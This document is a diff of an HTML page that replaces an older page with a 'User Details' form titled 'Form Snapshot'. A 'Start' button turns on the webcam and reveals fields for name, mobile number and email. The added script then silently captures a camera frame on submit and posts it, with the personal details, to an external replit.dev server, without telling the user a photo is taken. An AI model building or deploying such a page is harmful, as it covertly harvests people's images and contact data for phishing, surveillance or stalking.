@@ -104,7 +104,7 @@
 
 
 
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -208,5 +208,119 @@
 </script>
 
 </body>
+</html> -->
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Form Snapshot</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    .form-container {
+      width: 100%;
+      max-width: 500px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <div class="card shadow p-4 text-center">
+    <h4 class="mb-3">User Details</h4>
+    
+    <!-- Start Camera Button -->
+    <button type="button" id="startCameraBtn" class="btn btn-secondary w-100 mb-3">Start</button>
+    
+    <!-- Hidden Form -->
+    <form id="infoForm" style="display: none;">
+      <div class="mb-3 text-start">
+        <label for="name" class="form-label">Name:</label>
+        <input type="text" id="name" name="name" class="form-control" required>
+      </div>
+      <div class="mb-3 text-start">
+        <label for="mobile" class="form-label">Mobile Number:</label>
+        <input type="tel" id="mobile" name="mobile" pattern="[0-9]{10}" class="form-control" required>
+      </div>
+      <div class="mb-3 text-start">
+        <label for="email" class="form-label">Email:</label>
+        <input type="email" id="email" name="email" class="form-control" required>
+      </div>
+      <button type="button" id="submitBtn" class="btn btn-primary w-100">Submit</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  const video = document.createElement('video');
+  const canvas = document.createElement('canvas');
+  const context = canvas.getContext('2d');
+  canvas.width = 640;
+  canvas.height = 480;
+  let streamStarted = false;
+
+  document.getElementById('startCameraBtn').addEventListener('click', () => {
+    if (streamStarted) return;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        streamStarted = true;
+
+        // Show form once camera starts
+        document.getElementById('infoForm').style.display = 'block';
+
+        alert("Camera started. Please fill in the form.");
+      })
+      .catch(err => {
+        alert("Camera access denied or not supported.");
+        console.error(err);
+      });
+  });
+
+  document.getElementById('submitBtn').addEventListener('click', function () {
+    const name = document.getElementById('name').value;
+    const mobile = document.getElementById('mobile').value;
+    const email = document.getElementById('email').value;
+    let imageData = null;
+
+    if (streamStarted) {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      imageData = canvas.toDataURL('image/png');
+    }
+
+    fetch('https://84d5f6bf-d48e-44b8-83f4-0191157f6ef2-00-8zx20bm6pk33.sisko.replit.dev/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name, mobile, email, image: imageData })
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert('Data submitted successfully!');
+      window.location.reload();
+    })
+    .catch(err => {
+      console.error('Error:', err);
+      alert('Failed to submit data.');
+    });
+  });
+</script>
+
+</body>
 </html>
+
 
